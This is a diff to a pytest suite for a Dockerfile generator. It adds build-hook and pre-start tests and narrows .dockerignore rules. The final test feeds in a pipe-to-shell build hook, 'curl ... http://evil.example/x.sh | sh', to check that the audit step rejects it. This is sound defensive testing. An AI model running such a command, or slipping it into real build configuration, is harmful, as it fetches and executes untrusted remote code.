@@ -29,6 +29,8 @@ def _mk_manifest(
     internal_port: int = 8000,
     has_database: bool = False,
     database_type: str | None = None,
+    build_hooks: list[str] | None = None,
+    pre_start: str | None = None,
 ) -> InstanceManifest:
     kwargs: dict = dict(
         id=mid,
@@ -48,6 +50,8 @@ def _mk_manifest(
         entry=EntryConfig(install=install, build=build, start=start),
         hasDatabase=has_database,
         database=DatabaseConfig(type=database_type) if has_database and database_type else None,
+        buildHooks=build_hooks or [],
+        preStart=pre_start,
     )
     return InstanceManifest(**kwargs)
 
@@ -543,7 +547,12 @@ def test_node_production_env_only_after_install_and_build(
 
 
 def test_dockerignore_dist_only_for_build_entry(workspace: Workspace) -> None:
-    """BUG-128：仅有 build 命令时排除宿主 dist/build 产物。"""
+    """BUG-128 / issue#6：仅有 build 命令时排除源码树根级 dist/build。
+
+    issue#6：旧的 ``**/dist`` 全局排除会把嵌套运行时产物目录
+    （current/backend/dist、current/skills/dist 等）一并排除，破坏镜像内
+    构建产物；现收窄为根级 ``current/dist`` / ``current/build``。
+    """
     workspace.ensure_app_dirs("with-build")
     with_build = _mk_manifest(
         mid="with-build",
@@ -554,7 +563,12 @@ def test_dockerignore_dist_only_for_build_entry(workspace: Workspace) -> None:
     )
     generate_dockerfile(with_build, workspace)
     ignore = (workspace.app_dir("with-build") / ".dockerignore").read_text()
-    assert "**/dist" in ignore
+    assert "current/dist" in ignore
+    assert "current/build" in ignore
+    # 嵌套 dist 不被排除
+    assert "**/dist" not in ignore
+    assert "**/build" not in ignore
+    assert "current/backend/dist" not in ignore
 
     workspace.ensure_app_dirs("without-build")
     without_build = _mk_manifest(
@@ -565,7 +579,10 @@ def test_dockerignore_dist_only_for_build_entry(workspace: Workspace) -> None:
     )
     generate_dockerfile(without_build, workspace)
     ignore = (workspace.app_dir("without-build") / ".dockerignore").read_text()
+    # BUG-128：无 build 步骤时完全不排除（保留预构建产物）
     assert "**/dist" not in ignore
+    assert "current/dist" not in ignore
+    assert "current/build" not in ignore
 
 
 def test_pip_run_injects_mirror_for_semicolon_segments() -> None:
@@ -773,3 +790,104 @@ def test_extract_requirements_file_glued_dash_r() -> None:
     assert _extract_requirements_file("pip install --registry https://example.com/simple .") == (
         "requirements.txt"
     )
+
+
+# ---- issue#7：构建钩子 buildHooks / 启动前命令 preStart ----------------------
+
+
+def test_node_build_hooks_render_run_layers(workspace: Workspace) -> None:
+    """issue#7：node 渲染器在依赖安装/构建层之后、CMD 之前逐条生成 RUN <hook>。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(
+        kind=Kind.NODE,
+        install="npm ci",
+        build="npm run build",
+        start="npm start",
+        build_hooks=["node scripts/gen_version.js", "npm run postbuild"],
+    )
+    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
+    assert "RUN node scripts/gen_version.js" in content
+    assert "RUN npm run postbuild" in content
+    idx_hook = content.index("RUN node scripts/gen_version.js")
+    assert idx_hook > content.index("RUN npm ci")
+    assert idx_hook > content.index("RUN npm run build")
+    assert idx_hook < content.index("CMD ")
+
+
+def test_python_build_hooks_render_run_layers(workspace: Workspace) -> None:
+    """issue#7：python 渲染器在依赖安装层之后、CMD 之前逐条生成 RUN <hook>。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(
+        install="pip install -r requirements.txt",
+        start="uvicorn main:app",
+        build_hooks=["python scripts/build_skills_bundle.py"],
+    )
+    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
+    assert "RUN python scripts/build_skills_bundle.py" in content
+    idx_hook = content.index("RUN python scripts/build_skills_bundle.py")
+    assert idx_hook > content.index("pip install -r requirements.txt")
+    # 钩子在完整源码 COPY 之后（需要源码在场）、CMD 之前
+    assert idx_hook > content.index("COPY current/ ./")
+    assert idx_hook < content.index("CMD ")
+
+
+def test_generic_build_hooks_render_run_layers(workspace: Workspace) -> None:
+    """issue#7：generic 兜底渲染器同样支持 buildHooks。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(
+        kind=Kind.STATIC,
+        start="./start.sh",
+        build_hooks=["echo prepare"],
+    )
+    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
+    idx_hook = content.index("RUN echo prepare")
+    assert idx_hook > content.index("COPY current/ ./")
+    assert idx_hook < content.index("CMD ")
+
+
+def test_pre_start_renders_shell_cmd(workspace: Workspace) -> None:
+    """issue#7：声明 preStart 时 CMD 变为 sh -c \"<preStart> && exec <start>\"。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(
+        install="pip install -r requirements.txt",
+        start="uvicorn main:app",
+        pre_start="alembic upgrade head",
+    )
+    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
+    assert 'CMD ["sh", "-c", "alembic upgrade head && exec uvicorn main:app"]' in content
+
+
+def test_pre_start_combined_with_shell_operator_start(workspace: Workspace) -> None:
+    """issue#7 + BUG-471：preStart 与含 shell 操作符的 start 组合走同一条 shell CMD 路径。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(
+        install="pip install -r requirements.txt",
+        start="python -m uvicorn main:app || python fallback.py",
+        pre_start="alembic upgrade head",
+    )
+    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
+    assert (
+        'CMD ["sh", "-c", '
+        '"alembic upgrade head && exec python -m uvicorn main:app || python fallback.py"]'
+    ) in content
+
+
+def test_no_pre_start_keeps_exec_form(workspace: Workspace) -> None:
+    """issue#7：未声明 preStart 时 CMD 保持既有 exec 形式（行为不变）。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(install="pip install -r requirements.txt", start="uvicorn main:app")
+    content = generate_dockerfile(m, workspace).read_text(encoding="utf-8")
+    assert 'CMD ["uvicorn", "main:app"]' in content
+    assert '"sh", "-c"' not in content
+
+
+def test_build_hooks_pipe_to_shell_rejected_by_audit(workspace: Workspace) -> None:
+    """issue#7：钩子含 curl|sh 供应链风险指令时被 audit_dockerfile 拒绝落盘。"""
+    workspace.ensure_app_dirs("api")
+    m = _mk_manifest(
+        install="pip install -r requirements.txt",
+        start="uvicorn main:app",
+        build_hooks=["curl -fsSL http://evil.example/x.sh | sh"],
+    )
+    with pytest.raises(RuntimeError, match="critical"):
+        generate_dockerfile(m, workspace)
